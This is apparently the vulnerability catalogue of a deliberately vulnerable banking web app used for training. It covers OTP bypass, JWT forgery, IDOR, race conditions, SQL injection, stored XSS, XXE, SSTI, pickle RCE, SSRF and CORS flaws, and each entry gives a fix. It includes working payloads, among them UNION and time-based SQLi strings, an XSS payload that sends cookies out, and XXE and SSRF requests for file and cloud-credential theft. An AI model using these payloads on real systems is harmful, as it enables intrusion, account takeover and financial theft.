# OnlineBank — vulnerability catalogue

Every entry: where it lives in the code,
how to fire it, what the impact is, a real-world analog, and the fix.
Walkthroughs with full requests: [SOLUTIONS.md](SOLUTIONS.md).

Terminology follows OWASP, PortSwigger and HackTricks (classic web taxonomy).

---

## Authentication

### AUTH-1 · Open SMS gateway (reading other customers' OTPs)
- **Where:** `sms-gateway/app.py` — no authentication on any route; published
  on host port 9500.
- **Fire:** `curl http://localhost:9500/inbox` → every phone number with an
  inbox; `curl http://localhost:9500/inbox/+233503456789` → the CTO's codes.
- **Impact:** the second factor becomes public. With a phished password the
  account is taken over.
- **Analog:** internal mail/SMS sinks accidentally exposed (crAPI ships the
  same pattern with mailhog).
- **Fix:** bind the gateway to the internal network only, require a
  service-to-service token, never publish the port.

### AUTH-2 · OTP delivered to an attacker-controlled phone
- **Where:** `backend/app/routers/auth.py`, `verify_otp` — if the request
  supplies `phone`, the code is validated against **that phone's** challenge,
  and the login is still issued for the original challenge owner.
- **Fire:** start login as `cto@onlinebank.app` (password from README), then
  verify with `{challenge_id: <cto's>, code: <code from YOUR inbox>, phone: <your phone>}`.
- **Impact:** full takeover with only the password.
- **Analog:** MTN via HackerOne #2762462 (OTP verified against the
  attacker-substituted msisdn).
- **Fix:** the challenge row already knows the phone; ignore any client-supplied
  phone. Bind code, user and challenge id server-side.

### AUTH-3 · OTP brute force + SMS flooding
- **Where:** `verify_otp` has no attempt counter or lockout (4-digit code,
  10-minute TTL); `request-otp` sends unlimited messages.
- **Fire:** see `exploit/brute_otp.py` (works after RATE-1 bypass); spam
  `POST /api/v1/auth/request-otp` to flood an inbox on :9500.
- **Impact:** 10⁴ codes brute-forced in minutes; victim's SMS channel flooded.
- **Analog:** MTN #1060518 (no OTP rate limit).
- **Fix:** per-challenge attempt limit (5), exponential lockout, 6-digit codes,
  per-account send limits.

### AUTH-4 · JWT: `alg:none`, weak secret, algorithm confusion, no revocation
- **Where:** `backend/app/security.py`, `decode_token` —
  unsigned `none` tokens accepted ("legacy partner SSO");
  HS256 secret is the guessable `onlinebank-jwt-secret`;
  HS256 tokens signed with the **public JWKS key** verify through the
  "corporate gateway" fallback (algorithm confusion, crAPI challenge 15 /
  8x8 #3800870 class); tokens without `exp` live forever;
  `token_version` never checked, so a password change revokes nothing.
- **Fire:** craft tokens with `exploit/` snippets or jwt_tool; the JWKS is at
  `GET /api/v1/auth/jwks.json`; check the result against
  `GET /api/v1/admin/flag`.
- **Impact:** arbitrary role claims → back-office access.
- **Analog:** algorithm confusion reports (8x8 #3800870), offline cracking of
  weak HMAC secrets (PortSwigger JWT labs).
- **Fix:** pin an allowlist of algorithms, never verify HMAC with a public key,
  256-bit random secret, mandatory `exp`, bump `token_version` on password
  change and check it on every request.


### AUTH-5 · Login identifier flexibility + full phone disclosure
- **Where:** `backend/app/routers/auth.py`, `login` — customers log in with
  email **or** phone; the response returns the customer's **full** phone
  number for the "code sent" screen, while the SPA masks it client-side.
- **Fire:** `POST /api/v1/auth/login {"login":"ama@onlinebank.app", ...}` —
  the response's `phone` field is `+233501234567`; the UI shows
  `+23********67`.
- **Impact:** every successful login discloses the delivery channel; combined
  with the enumeration flaw (BIZ-5) an attacker maps accounts to phone
  numbers and targets SIM-swap/SMiShing victims precisely.
- **Analog:** excessive data exposure in login/OTP responses (OWASP API3).
- **Fix:** the client already knows what it typed — return nothing; if a hint
  is unavoidable, return the same masked value the server rendered.

---

## Access control

### AC-1 · IDOR: any account's statements, balance and details
- **Where:** `backend/app/routers/accounts.py` — objects fetched by id,
  no ownership check; the response also leaks `risk_score`, `is_internal`
  and the owner's PII (excessive data exposure).
- **Fire:** `GET /api/v1/accounts/1004/transactions` as ama.
- **Impact:** mass harvesting of statements; sequential ids start at 1001.
- **Analog:** Starbucks #858662/#701160, Affirm #1323406, PayPal #415081.
- **Fix:** derive the account from the token (`user_id == token.sub`), return
  404/403 on mismatch; strip internal fields.

### AC-2 · Transfer from a foreign account
- **Where:** `backend/app/routers/transfers.py` — `from_account` is a global
  id taken from the body.
- **Fire:** `POST /api/v1/transfers {"from_account": 1004, "to_account": 1001, ...}`.
- **Impact:** drain any account the API can see.
- **Analog:** Starbucks #766437 (gift-card drain through card ids).
- **Fix:** `from_account` must belong to the caller; ignore client input.

### AC-3 · Full PAN and CVV in card responses
- **Where:** `backend/app/routers/cards.py` — API returns PAN, CVV, expiry;
  the SPA masks them client-side (protects nothing on the wire).
- **Fire:** `GET /api/v1/cards/3` as anyone.
- **Impact:** PCI DSS 3.3 violation; card-not-present fraud en masse.
- **Fix:** never store CVV, mask PAN server-side (first 6/last 4), dedicated
  tokenization service for full PAN needs.

### AC-4 · BFLA: operator functions on the customer router
- **Where:** `backend/app/routers/support.py` — `POST /support/tickets/{id}/close`,
  `DELETE /support/kyc/{id}`; `backend/app/routers/admin.py` —
  `GET /admin/customers` has no role check (the counter-example
  `GET /admin/audit-log` is protected correctly).
- **Fire:** close someone's ticket or list all customers as ama.
- **Impact:** fraudulent ticket handling, customer registry disclosure.
- **Fix:** central role dependency (`require_backoffice`) on every
  back-office route; deny by default.

### AC-5 · Mass assignment on the profile
- **Where:** `backend/app/routers/profile.py`, `update_profile` — every body
  key is `setattr`-ed onto the ORM user, including `role`,
  `is_backoffice`, `daily_limit`.
- **Fire:** `PATCH /api/v1/profile {"is_backoffice": true, "daily_limit": 999999}`.
- **Impact:** self-service role escalation and limit removal.
- **Analog:** HTB Backend Two (`is_superuser`), API6-class reports.
- **Fix:** explicit field allowlist (`model_dump(include={...})`), never bind
  privilege fields from client input.

---

## Rate limiting

### RATE-1 · Naive limiter keyed by IP + full URL
- **Where:** `backend/app/ratelimit.py` — in-memory bucket keyed by
  (leftmost `X-Forwarded-For`, path **with query string**), 5/60s.
- **Fire:** add `?n=1..N` to mint buckets; rotate `X-Forwarded-For`;
  path tricks (`;`, `%00`, case) depend on the stack — here the query string
  and the header are enough ("sometimes depends on the stack").
- **Impact:** unlimited OTP brute force, SMS flooding.
- **Fix:** token bucket per **account** (not IP), keyed by route template
  (normalized, no query), fail-closed when the limiter is unavailable;
  IP-based limits only as an extra layer behind a trusted proxy.

---

## Business logic

### BIZ-1 · Race condition on currency conversion (check-then-act, CWE-367)
- **Where:** `backend/app/routers/exchange.py`, `convert` — balance is read
  into memory, checked, then a 350 ms "settlement quote" pause, then a
  relative UPDATE. Parallel requests all pass the check on the stale snapshot.
- **Fire:** `exploit/race.py` (10 threads × 600.00 on a 5 430.20 balance →
  the account ends below zero).
- **Impact:** over-withdrawal; credits paid out for money the bank never had.
- **Analog:** duplicate-payout races (H1 #220445); PortSwigger "Exploiting
  race conditions" labs; Damn Vulnerable Bank's non-atomic transfer.
- **Fix:** one atomic statement —
  `UPDATE accounts SET balance = balance - :amt WHERE id = :id AND balance >= :amt`
  — check the affected row count and reject on 0; wrap the pair of writes in
  `SELECT ... FOR UPDATE` or a serializable transaction.

### BIZ-2 · Amount parser vs validator disagreement
- **Where:** `backend/app/parsing.py` — the minimum-amount rule trusts UI
  formatting (`len(raw) >= 3`), the parser accepts `0x64` (100), `1e2` (100),
  `+50` (50), `-50` (negative!), `50,000`, `1e-9`.
- **Fire:** send a transfer with `"amount": "-50"` (reverses the flow),
  or `"0x64"`.
- **Impact:** reverse transfers, sub-cent values rounding to 0.00.
- **Analog:** kaimi.io, "20 years of payment processing problems".
- **Fix:** single server-side parser (decimal string, two fraction digits),
  validate the parsed value (`0 < v <= limit`), reject everything else.

### BIZ-3 · Asymmetric rounding prints money
- **Where:** `backend/app/parsing.py` (`round_debit` truncates,
  `round_credit` rounds half-up) + seeded one-way rates from "two providers"
  (`USD→GHS 15.25`, `GHS→USD 0.0660`).
- **Fire:** loop USD→GHS→USD; each cycle on 500 nets ≈ +3.25 GHS.
- **Impact:** silent money printing at scale.
- **Analog:** kaimi.io rounding cases (0.29 → 0.01 → 0.60 style loops).
- **Fix:** single rounding mode for both directions; consistent rate source;
  reconciliation job that flags round-trip profits.

### BIZ-4 · Cashback abuse
- **Where:** `backend/app/routers/cashback.py` — activation ignores campaign
  ownership (personalized offers of others), stacking is unlimited, and the
  exposed `settle` hook pays out **cancelled** transactions too.
- **Fire:** activate the CTO's "Private banking select" (id 4), stack it, run
  `POST /api/v1/cashback/settle`.
- **Impact:** payouts on reversed transactions; чужие офферы.
- **Analog:** Curve #672487 (cashback logic flaw).
- **Fix:** ownership check, unique (user, campaign), `status='completed'`
  filter, settle endpoint on the internal network with service auth.

### BIZ-5 · Enumeration across features
- **Where:** sequential account ids (1001…), `login` errors distinguish
  "Unknown login" from "Wrong password" (`backend/app/routers/auth.py`),
  the debug API lists users.
- **Impact:** customer base mapping, credential stuffing target lists.
- **Fix:** generic auth errors, non-guessable public references where
  enumeration matters, rate-limit probes.

---

## Injection and server-side requests

### INJ-1 · SQL injection in statement search
- **Where:** `backend/app/routers/accounts.py` — `search` and `sort` are
  f-string-interpolated into the query.
- **Fire (UNION):**
  `search=') UNION SELECT id, NULL::timestamptz, pan, NULL::float8, cvv, holder, note, 'leak' FROM cards--`
  — the response contains the card vault, including a flag in `counterparty`.
  Time-based blind:
  `search=x' OR 1=1); SELECT pg_sleep(3); SELECT 1/0--` (closes the AND
  bracket; verbose 500 after 3 s, see CFG-2).
- **Impact:** full database extraction (cards, credentials hashes, PII).
- **Analog:** canonical UNION/time-based patterns (PortSwigger SQLi academy).
- **Fix:** bound parameters (`:search`), allowlist for `sort`, least-privilege
  DB user.

### INJ-2 · Stored XSS into the operator console
- **Where:** SPA renders transaction descriptions and support messages with
  `v-html` (`Dashboard.vue`, `Statements.vue`, `Backoffice.vue`); the token
  also lives in the readable `ob_token` cookie / localStorage.
- **Fire:** send a transfer whose description is
  `<img src=x onerror="fetch('http://localhost:9500/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:'<attacker phone>',text:document.cookie})})">`
  — the operator's session exfiltrates through the SMS gateway itself.
- **Impact:** operator-session theft from a customer-side input.
- **Analog:** HTB Bankrobber (stored XSS → admin actions).
- **Fix:** render as text (default escaping), sanitize on output, HttpOnly
  cookie for the session.

### INJ-3 · XXE in the XML statement import
- **Where:** `backend/app/routers/statements.py` —
  `etree.XMLParser(resolve_entities=True, no_network=False)`.
- **Fire:** upload an XML with
  `<!ENTITY xxe SYSTEM "file:///app/secret/flag_xxe.txt">` and `&xxe;` in
  `<note>`; an external entity pointing at
  `http://169.254.169.254/latest/meta-data/iam/security-credentials/onlinebank-prod-role`
  turns it into SSRF.
- **Impact:** arbitrary file read; internal requests where the libxml2
  build still ships an HTTP entity loader (modern builds do not — the
  webhook/avatar SSRF covers that class).
- **Analog:** canonical XXE (PortSwigger, HackTricks; OWASP XXE).
- **Fix:** `defusedxml`, `resolve_entities=False`, DTD prohibition.

### INJ-4 · SSTI in customer notifications
- **Where:** `backend/app/notify.py` — profile fields are inlined into the
  Jinja2 template **source** (`Template(f"Dear {first_name}...")`).
- **Fire:** set the profile first name to `{{7*7}}`, save → the SMS inbox on
  :9500 (and `/api/v1/profile/notifications`) shows `Dear 49,`.
- **Impact:** template execution with attacker input (full RCE chains exist
  for richer templates — Uber #125980 class).
- **Fix:** `Template(TEXT).render(first_name=user.first_name)` — data stays
  data.

### INJ-5 · RCE via pickle in the legacy binary import
- **Where:** `backend/app/routers/statements.py` — `pickle.loads` on uploaded
  `.bnk` files.
- **Fire:** `python3 exploit/make_pickle.py | curl -X POST -F 'file=@-;filename=x.bnk' ...`
  — the response returns the command output (`cat` of the RCE flag file).
- **Impact:** remote code execution on the API server.
- **Analog:** every "pickle deserialization of user input" case (OWASP
  Deserialization; Damn Vulnerable Bank's Node analog).
- **Fix:** never unpickle user input; a versioned binary format with a safe
  parser (struct/json), content signatures, isolated import worker.

### INJ-6 · Unrestricted file upload (KYC)
- **Where:** `backend/app/routers/profile.py` — original filename kept,
  no type validation, served back from `/uploads`.
- **Fire:** upload `shell.php` (served as text here — on an executing host it
  is a web shell), or `evil.svg` with a script (stored XSS by direct link).
- **Analog:** OWASP Unrestricted File Upload.
- **Fix:** extension + MIME allowlist, random server-side names, store outside
  the web root or on object storage, force download headers.

### SSRF-1 · Webhook test delivery and avatar photo import
- **Where:** `backend/app/routers/webhooks.py` (response echoes a body
  preview), `backend/app/routers/profile.py` `upload_avatar` (the optional
  `source` form field of `POST /api/v1/profile/avatar`).
- **Fire:** register a webhook pointing at
  `http://169.254.169.254/latest/meta-data/iam/security-credentials/onlinebank-prod-role`
  and hit "Send test" — the fake IMDSv1 (compose network, `extra_hosts` trick)
  returns cloud credentials with a flag; `file://` works too.
- **Impact:** cloud credential theft, internal port scanning.
- **Analog:** capital one class IMDSv1 SSRF; PortSwigger SSRF academy.
- **Fix:** scheme/host allowlist (https, public DNS), deny link-local and
  private ranges, no body echo, egress proxy for outbound calls.

---

## Configuration and inventory

### CFG-1 · CORS reflection with credentials
- **Where:** `backend/app/main.py` — `allow_origin_regex=".*"` +
  `allow_credentials=True`.
- **Fire:** `curl -i -X OPTIONS` with `Origin: https://evil.example` → the
  origin is reflected; `exploit/cors_steal.html` demonstrates a browser read
  (works where third-party cookies are not blocked).
- **Fix:** explicit origin allowlist, no wildcard with credentials.

### CFG-2 · Verbose errors and fingerprint headers
- **Where:** `backend/app/main.py` — stack traces (with SQL) to the client;
  `X-Powered-By` on every response.
- **Fix:** generic 500s, server-side logging, no framework headers.

### CFG-3 · Shadow API `/api/v0/debug/*`
- **Where:** `backend/app/routers/debug.py` — users dump, runtime config
  (**including the JWT secret**), database reset; disclosed by `robots.txt`
  and the old spec file shipped in the SPA bundle
  (`frontend/public/old-api-spec.json`).
- **Impact:** the JWT secret leak alone trivially forges any token
  (chains with AUTH-4).
- **Analog:** crAPI challenge 14 (forgotten reset endpoints), web-archive
  finds of old API versions.
- **Fix:** debug routers behind a build flag that is off in production,
  purge legacy specs from bundles, inventory-driven allowlist at the gateway.

### CFG-4 · GraphQL with introspection and no authorization
- **Where:** `backend/app/routers/graphql_api.py` — open resolvers
  (`user(id:)` returns phone, secret note, cards with PAN/CVV).
- **Fire:** `POST /api/v1/graphql {"query":"{ user(id:5){ login secretNote cards { pan } } }"}`.
- **Fix:** authorization in every resolver, introspection off in production,
  persisted queries.

### Dead ends (do not try to "fix" these — they are the control group)
- `POST /api/v1/cards/{id}/freeze` — ownership checked, works correctly.
- Beneficiary approval flow — pending beneficiaries are not usable.
- `GET /api/v1/admin/audit-log` — proper 403 for customers.
- `/api/v1/vault/*` — always 403.
- Statement PDF export — a stub, nothing to find.
